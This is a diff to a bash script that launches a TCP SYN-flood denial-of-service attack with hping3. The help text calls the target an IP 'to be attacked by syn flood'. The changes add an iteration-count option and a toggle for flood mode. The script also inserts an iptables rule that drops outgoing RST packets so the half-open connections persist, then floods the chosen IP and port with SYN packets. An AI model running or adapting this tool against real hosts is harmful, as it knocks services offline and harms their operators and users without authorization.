@@ -6,11 +6,15 @@ function print_help ()
   echo -e "It is mandatory to include -d and -p option, script should be run with sudo."
   echo -e "-d \t --ip-destination \t\t Ip destination to be attacked by syn flood."
   echo -e "-p \t --port-destination \t\tPort which will be attacked on the remote TCP end point."
+  echo -e "-c \t --count \t\tSet a iteration limit, will be ignored if --flood."
+  echo -e "-f \t --flood \t\tEnable the flood parameter, this will make request at a high speed."
   exit
 }
 
 ip_destination="";
 port="";
+flood="";
+count="";
 
 while [[ $# -gt 0 ]]; do
   ARG="$1"
@@ -25,7 +29,16 @@ while [[ $# -gt 0 ]]; do
       shift
       shift
       ;;
-    "-h"|"--help")
+    "-f"|"--flood")
+      flood="--flood"
+      shift
+      ;;
+    "-c"|"--count")
+      count="-c $2"
+      shift
+      shift
+      ;;
+      "-h"|"--help")
       print_help
       shift
       ;;
@@ -58,4 +71,4 @@ iptables -I OUTPUT 1 -d $ip_destination -p tcp --tcp-flags RST RST -j DROP
 
 echo "Attacking remote $ip_destination and port $port"
 
-hping3 -M 0 -S "$ip_destination" -p "$port" --flood > /var/log/hping3.log 2>&1
+hping3 $count -M 0  $flood -S "$ip_destination" -p "$port" > /var/log/hping3.log 2>&1
